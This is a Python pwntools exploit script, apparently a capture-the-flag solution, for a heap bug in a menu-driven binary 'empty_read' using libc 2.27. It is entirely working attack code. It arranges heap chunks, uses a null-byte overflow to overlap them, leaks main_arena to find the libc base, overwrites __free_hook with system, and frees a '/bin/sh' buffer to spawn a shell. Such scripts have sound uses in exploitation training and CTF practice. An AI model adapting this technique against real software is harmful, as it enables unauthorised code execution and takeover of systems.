from pwn import *
elf = context.binary = ELF('./empty_read', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)
ld = ELF('./ld-2.27.so', checksec=False)

io = process()

def run_command_loop(cmd, start, end, *args):
    args = list(args)
    for i in range(start, end):
        args[0] = str(i).encode()
        cmd(*args)

def create_user(*args):
    io.sendlineafter(b'-\n', b'add')
    io.sendlineafter(b':\n', args[0])
    io.sendlineafter(b':\n', args[1])
    io.sendafter(b':\n', args[2])

def delete_user(*args):
    io.sendlineafter(b'-\n', b'delete')
    io.sendlineafter(b':\n', args[0])

def edit_user(*args):
    io.sendlineafter(b'-\n', b'edit')
    io.sendlineafter(b':\n', args[0])
    io.sendafter(b':\n', args[1])

def print_users():
    io.sendlineafter(b'-\n', b'print')
    return io.recvuntil(b'Enter command:', drop=True)


def extract_arena_addr(data):
    return u32(data[260:])

run_command_loop(create_user, 0, 5, b'0', b'12', b'dummy@ptr')
run_command_loop(delete_user, 0, 5, 0, b'12', b'dummy@ptr')

run_command_loop(create_user, 0, 7, b'0', b'508', b'dummy@ptr')
create_user(b'7', b'508', b'null@byt3_0v3rfl0w')
create_user(b'8', b'508', b'null@byt3_0v3rfl0w')
create_user(b'9', b'512', b'victim@___')
run_command_loop(delete_user, 0, 7, 0, b'12', b'dummy@ptr')
delete_user(b'7')
edit_user(b'8', b'\x41' * 0x1f8 + p32(0x400))
edit_user(b'9', b'\x41' * 0x1fc + p32(0x11))
delete_user(b'9')

run_command_loop(create_user, 0, 5, b'0', b'508', b'dummy@ptr')
create_user(b'5', b'12', b'rogue@tcac33')
create_user(b'6', b'12', b'rogue@tfb')
create_user(b'7', b'492', b'some_1nf0_l3ak@yes?')

main_arena = extract_arena_addr(print_users()) - 0x38
arena_offset = libc.sym['__malloc_hook'] + 0x18
libc.address = main_arena - arena_offset
__free_hook = libc.sym['__free_hook']


print(f'[+] leaked main_arena:={hex(main_arena)}')
print(f'[*] calculating libc base...')
print(f'[+] libc base:={hex(libc.address)}')
print(f'[+] __freehook:={hex(__free_hook)}')

create_user(b'9', b'23', b'write_what@where!?')
edit_user(b'8', b'\x41' * 0x4 + p32(__free_hook))

system = libc.sym['system']

print('[+] overwrote __free_hook with system')
edit_user(b'9', p32(system))

edit_user(b'0', b'/bin/sh\x00')
delete_user(b'0')

io.interactive()